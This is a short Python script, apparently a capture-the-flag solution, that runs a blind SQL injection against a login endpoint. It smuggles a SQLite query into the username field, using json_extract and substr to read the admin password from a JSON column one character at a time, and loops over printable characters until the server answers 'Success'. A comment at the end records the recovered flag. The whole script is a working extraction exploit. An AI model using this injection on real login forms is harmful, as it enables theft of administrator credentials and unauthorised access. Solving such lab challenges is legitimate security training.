import requests
import string

bucket = string.printable

url = "http://10.113.184.121:10081/login"

flag = ""

idx = 1
while True:
    _check = True
    for _char in bucket:
        print(f"\r{_char} ", end='')

        _username = f"\"), substr(json_extract(users, '$.admin.password'), {idx}, 1) AS password FROM db; --"
        payload = {'username': _username, 'password': _char}

        r = requests.post(url=url, data=payload)

        if "Success" in r.text:
            idx += 1
            flag += _char
            _check = False
            print()
            break

    if _check:
        break

print(f"\n{flag = }")

# flag = 'FLAG{sqlite_js0n_inject!on}'
